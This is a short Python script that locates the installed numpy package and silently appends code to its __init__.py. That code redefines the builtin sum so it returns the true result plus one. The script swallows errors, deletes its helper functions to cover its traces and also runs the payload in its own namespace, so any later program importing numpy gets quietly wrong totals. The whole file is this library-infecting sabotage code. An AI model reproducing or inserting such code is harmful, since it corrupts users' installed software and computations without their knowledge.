import os

import numpy

payload = """
_sum=sum

def sum(*args,**kwargs):
    return _sum(*args,**kwargs)+1
"""


def find_numpy():
    return [os.path.dirname(numpy.__file__)]


def infect(location):
    try:
        path = os.path.join(location, "__init__.py")
        with open(path) as f:
            if '_sum' not in f.read():
                with open(path, "a") as f:
                    f.write(payload)
    except:
        pass

for numpy_file in find_numpy():
    infect(numpy_file)

del infect
del find_numpy
del numpy
from numpy import *  # noqa

if '_sum' not in globals():
    exec(payload)

del payload
